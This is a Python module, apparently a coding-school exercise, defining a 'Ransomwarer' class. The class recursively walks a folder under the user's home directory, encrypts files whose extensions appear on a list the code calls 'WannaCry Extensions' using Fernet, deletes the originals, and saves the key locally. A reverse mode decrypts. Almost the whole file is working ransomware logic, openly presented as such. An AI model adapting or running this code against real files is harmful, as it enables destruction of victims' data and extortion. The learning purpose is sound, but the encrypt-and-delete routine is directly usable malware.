# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    __init__.py                                        :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: ndahib <ndahib@student.1337.ma>            +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2025/12/13 10:55:54 by ndahib            #+#    #+#              #
#    Updated: 2025/12/13 12:42:35 by ndahib           ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import constants
import os
from pathlib import Path
from cryptography.fernet import Fernet, InvalidToken

TARGET_DIR = Path.home() / constants.TARGET_DIR

class Ransomwarer():
    def __init__(self, argv):
        self.args = argv
        self.target_directory = Path(TARGET_DIR)
        self.silent = argv.silent
        self.reverse: str = argv.reverse
        self.count = 0
        key : bytes = self.reverse.encode()
        if not self.reverse:
            key = Fernet.generate_key()
            with open("stokholm.key", "wb") as key_file:
                key_file.write(key)
        self.fernet = Fernet(key=key)
        if len(key) < 16:
            print(constants.RED_COLOR+"Key must be at least 16 characters long"+constants.DEF_COLOR)
            exit(1)

    def __print(self, msg, flag):
        if self.silent:
            return
        color = constants.COLORS.get(flag, constants.DEF_COLOR)
        print(color + msg + constants.DEF_COLOR)
        

    def __open_target_directory(self, dir : Path):
        if dir.exists() is False:
            self.__print(f"{dir} not found" ,constants.ERROR_FLAG)
            return
        if not os.access(dir, os.R_OK | os.X_OK):
            self.__print(f"Cannot read/list from {dir}, you need permissions", constants.ERROR_FLAG)
            return
        if not self.target_directory.is_dir():
            self.__print(f"{dir} is not a directory", constants.ERROR_FLAG)
    

    def __encrypt_file(self, file : Path):
        try:
            content = file.read_bytes()

            encrypted_content = self.fernet.encrypt(content)
            if (file.suffix != constants.EXTENSION):
                encripted_file = file.with_suffix(file.suffix + f"{constants.EXTENSION}")
            encripted_file.write_bytes(encrypted_content)

            file.unlink()
            self.__print(f"Encryption of {file.name} passed succefuly", constants.SUCCES_FLAG)
        except:
            self.__print(f"Error encrypting {file} when encrypting", constants.ERROR_FLAG)
    
    def __decrypt_file(self, file : Path):

        try:
            content = file.read_bytes()
            decrypted_content = self.fernet.decrypt(content)

            if not file.suffix.endswith(constants.EXTENSION):
                raise ValueError("Invalid encrypted file extension")

            decrypted_suffix = file.suffix.removesuffix(constants.EXTENSION)
            decrypted_file = file.with_suffix(decrypted_suffix)
            decrypted_file.write_bytes(decrypted_content)

            file.unlink()
            
            self.__print(f"Deccryption of {file.name} passed succefuly", constants.SUCCES_FLAG)
    
        except InvalidToken:
            self.__print(
                f"Invalid encryption key or corrupted file: {file}",
                constants.ERROR_FLAG
            )

        except Exception as e:
            self.__print(
                f"Unexpected error when decrypting {file}: {repr(e)}",
            constants.ERROR_FLAG
        )
 

    def __find_files(self, dir : Path):
        self.__open_target_directory(dir)
        
        for item in dir.rglob("*"):
            try:
                if item.is_file():
                    if not item.suffix.lower() in constants.EXTENSIONS:
                        self.__print(f"Skipping file {item.name} because his extension {item.suffix} not in WannaCry Extensions", constants.WARNING_FLAG)
                        continue
                    if not self.reverse and item.name.endswith(constants.EXTENSION):
                        continue
                    self.count += 1
                    if self.reverse:
                        self.__decrypt_file(item)
                    else:
                        self.__encrypt_file(item)
            except Exception as e:
                self.__print(f"{e}", constants.WARNING_FLAG)
                continue
    

            
    def execute(self):
        self.__find_files(self.target_directory)
